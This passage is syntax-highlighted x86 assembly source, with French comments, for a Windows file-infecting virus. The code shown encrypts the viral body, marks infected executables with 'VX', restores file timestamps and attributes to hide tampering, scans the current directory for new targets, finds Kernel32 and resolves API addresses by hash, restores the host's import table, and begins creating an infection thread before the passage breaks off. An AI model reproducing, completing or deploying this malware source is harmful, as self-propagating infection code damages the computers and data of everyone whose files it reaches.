</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">debut_virus</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">TAILLE_VIRUS</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">crypt</span><span class="sc0">


</span><span class="sc1">;on marque la cible pour ne pas la reinfecter</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">adr_map_cible</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">edi.MZ_csum</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'VX'</span><span class="sc0">
</span><span class="sc6">stosw</span><span class="sc0">

</span><span class="sc1">;[Fin de la routine de transfert des deux parties du virus]</span><span class="sc0">

</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">sortie_infection</span><span class="sc0">

</span><span class="sc5">err_infection</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">struct_recherche</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.WFD_nFileSizeLow</span><span class="sc4">],</span><span class="sc5">TAILLE_VIRUS_ALIGNE_FICHIER</span><span class="sc0">


</span><span class="sc1">;[Debut de la restitution a l'O.S et de la fermeture du fichier cible]:</span><span class="sc0">

</span><span class="sc5">sortie_infection</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">struct_recherche</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc10">stdcall</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">UnmapViewOfFile</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],[</span><span class="sc5">adr_map_cible</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc10">stdcall</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CloseHandle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],[</span><span class="sc5">handle_map_cible</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">handle_fichier_cible</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc10">stdcall</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SetFilePointer</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.WFD_nFileSizeLow</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc10">stdcall</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SetEndOfFile</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">edi.WFD_ftLastWriteTime</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">edi.WFD_ftLastAccessTime</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">edi.WFD_ftCreationTime</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SetFileTime</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">


</span><span class="sc10">stdcall</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CloseHandle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">edi.WFD_szFileName</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc10">stdcall</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SetFileAttributesA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.WFD_dwFileAttributes</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;[Fin de la fermeture du fichier cible]</span><span class="sc0">

</span><span class="sc9">if</span><span class="sc0"> </span><span class="sc5">SEH</span><span class="sc4">=</span><span class="sc5">TRUE</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">fs</span><span class="sc4">:</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc9">if</span><span class="sc0">

</span><span class="sc6">popad</span><span class="sc0">
}

</span><span class="sc1">;[Fin de la fonction infectieuse]</span><span class="sc0">







</span><span class="sc1">;[Debut de la recherche dans le repertoire courant]:</span><span class="sc0">


</span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc5">RECHERCHE_CIBLE_DANS_REPERTOIRE_COURANT</span><span class="sc0">
{

</span><span class="sc5">recherche_cible_dans_repertoire_courant</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">pushad</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">TYPE_FICHIER_RECHERCHE0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">TYPE_FICHIER_RECHERCHE1</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
</span><span class="sc10">stdcall</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FindFirstFileA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">sortie_recherche_fichier</span><span class="sc0">

</span><span class="sc5">fichier_suivant</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">INFECTION</span><span class="sc0">

</span><span class="sc10">stdcall</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FindNextFileA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">fichier_suivant</span><span class="sc0">

</span><span class="sc5">sortie_recherche_fichier</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">popad</span><span class="sc0">

}

</span><span class="sc1">;[Fin de la recherche dans le repertoire courant]</span><span class="sc0">



</span><span class="sc1">;[Debut du programme hote regulier]:</span><span class="sc0">

</span><span class="sc5">commencement</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc9">invoke</span><span class="sc0"> </span><span class="sc5">faux_Sleep</span><span class="sc4">,</span><span class="sc5">DUREE_PAUSE1</span><span class="sc0">
</span><span class="sc9">invoke</span><span class="sc0"> </span><span class="sc5">faux_ExitProcess</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;[Fin du programme hote regulier]</span><span class="sc0">




</span><span class="sc5">__ExitProcess</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">__Sleep</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">execution_fct_k32</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pushad</span><span class="sc0">






</span><span class="sc1">;[Debut reel du virus]:</span><span class="sc0">

</span><span class="sc5">debut_virus</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;[Calcul du decalage du a la relocation du code du virus]:</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ici</span><span class="sc0">
</span><span class="sc5">ici</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc5">ici</span><span class="sc0">

</span><span class="sc1">;[Fin du calcul du a la relocation]</span><span class="sc0">



</span><span class="sc1">;Premiere execution du code viral</span><span class="sc0">


</span><span class="sc1">;[Debut de la recherche de l'adresse de Kernel32]:</span><span class="sc0">

</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">8bh</span><span class="sc4">,</span><span class="sc2">15h</span><span class="sc0">      </span><span class="sc1">;mov edx,[&lt;adr&gt;]</span><span class="sc0">
</span><span class="sc5">ptr1_adr_globalalloc</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc0">


</span><span class="sc1">;[Debut de la remise a zero de l'emplacement dans la section 'data' utilise]:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">ptr1_adr_globalalloc</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">stosd</span><span class="sc0">

</span><span class="sc1">;[Fin de la remise a zero]</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc5">recherche_mz</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.MZ_magic</span><span class="sc4">],</span><span class="sc5">MZ_MAGIC</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">recherche_mz</span><span class="sc0">

</span><span class="sc1">;une signature "MZ" a ete trouvee</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ecx.MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">recherche_mz</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">recherche_mz</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ecx.FH_Signature</span><span class="sc4">],</span><span class="sc5">PE_MAGIC</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">recherche_mz</span><span class="sc0">

</span><span class="sc1">;[Fin de recherche de l'adresse de Kernel32]</span><span class="sc0">

</span><span class="sc1">;ecx pointe sur l'en-tete IMAGE_FILE_HEADER de Kernel32</span><span class="sc0">
</span><span class="sc1">;edx contient l'adresse de Kernel32</span><span class="sc0">




</span><span class="sc1">;[Debut de la recherche des fonctions de Kernel32 utilisees par le virus]:</span><span class="sc0">

</span><span class="sc1">;eax pointe sur le debut de la structure IMAGE_DIRECTORY_DATA de la directory</span><span class="sc0">
</span><span class="sc1">;export:</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc5">sizeof.IMAGE_FILE_HEADER</span><span class="sc4">+</span><span class="sc5">sizeof.IMAGE_OPTIONAL_HEADER</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.DD_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.ED_AddressOfNames</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">NBRE_FCT_K32_VIRUS</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">recherche_adr_fct_k32_virus</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc1">;[Debut du calcul d'un condense pour le nom de la fonction de Kernel32</span><span class="sc0">
</span><span class="sc1">;en cours de test]:</span><span class="sc0">

</span><span class="sc6">pushad</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc5">caractere_suivant</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">lodsb</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">fin_chaine</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">caractere_suivant</span><span class="sc0">

</span><span class="sc5">fin_chaine</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">condense</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">popad</span><span class="sc0">

</span><span class="sc1">;[Fin du calcul du condense]</span><span class="sc0">

</span><span class="sc1">;[Debut de la recherche du condense dans la table des condenses pre-calcules</span><span class="sc0">
</span><span class="sc1">;des fonctions de Kernel32 utilisees par le virus]:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">condense</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">NBRE_FCT_K32_VIRUS</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">tab_condense</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">repne</span><span class="sc0"> </span><span class="sc6">scasd</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">recherche_adr_fct_k32_virus</span><span class="sc0">


</span><span class="sc1">;[Fin de la recherche du condense dans la table]</span><span class="sc0">


</span><span class="sc1">;[Recuperation de l'adresse de la fonction de Kernel32 dont le condense du nom</span><span class="sc0">
</span><span class="sc1">;est dans la table]:</span><span class="sc0">

</span><span class="sc6">pushad</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.ED_AddressOfNamesOrdinals</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.ED_AddressOfFunctions</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc5">NBRE_FCT_K32_VIRUS</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc6">popad</span><span class="sc0">

</span><span class="sc1">;[Fin de la recuperation de l'adresse de la fonction de Kernel32]</span><span class="sc0">

</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">recherche_adr_fct_k32_virus</span><span class="sc0">

</span><span class="sc1">;[Fin de la recherche des fonctions de Kernel32 utilisees par le virus]</span><span class="sc0">





</span><span class="sc1">;[Debut de la recuperation des adresses des fonctions de Kernel32 utilisees</span><span class="sc0">
</span><span class="sc1">;par l'hote]:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">rva_orig_1st_thunk_avant_infection_hote</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">adr_image_base</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">tab_adr_fct_k32_hote</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">explore_struct_import_by_name_k32_hote</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">lodsd</span><span class="sc0">
</span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">fin_recuperation_fct_k32_hote</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">adr_image_base</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">pushad</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">eax.IBN_Name</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc10">stdcall</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">GetProcAddress</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">28</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">popad</span><span class="sc0">           </span><span class="sc1">;seulement eax est modifie</span><span class="sc0">


</span><span class="sc6">stosd</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">explore_struct_import_by_name_k32_hote</span><span class="sc0">

</span><span class="sc5">fin_recuperation_fct_k32_hote</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;[Recuperation de la fonction de Kernel32 dont la structure</span><span class="sc0">
</span><span class="sc1">;IMPORT_BY_NAME a ete changee pour accueillir le nom GlobalAlloc]:</span><span class="sc0">

</span><span class="sc6">pushad</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">sz_nom_fct_k32_altere_hote</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc10">stdcall</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">GetProcAddress</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">index_fct_k32_altere_hote</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">tab_adr_fct_k32_hote</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">stosd</span><span class="sc0">
</span><span class="sc6">popad</span><span class="sc0">


</span><span class="sc1">;[Fin recuperation de la derniere fonction de Kernel32 de l'hote]</span><span class="sc0">

</span><span class="sc1">;[Fin de la recuperation des adresses utilisees par l'hote]</span><span class="sc0">



</span><span class="sc1">;[Debut de la restauration de la table pointee par ID_FirstThunk, telle qu'elle</span><span class="sc0">
</span><span class="sc1">;serait apres demarrage de l'hote qui n'aurait pas ete infecte]:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">nbre_fct_k32_cible</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">tampon</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">adr_1st_thunk_avant_infection_hote</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc10">stdcall</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">VirtualProtect</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">PAGE_EXECUTE_READWRITE</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">tab_adr_fct_k32_hote</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">cld</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsd</span><span class="sc0">

</span><span class="sc1">;[Fin de la restauration de la table]</span><span class="sc0">



</span><span class="sc1">;[Debut de creation de la thread infectieuse]:</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">thread_id</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">proc_infectieuse</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
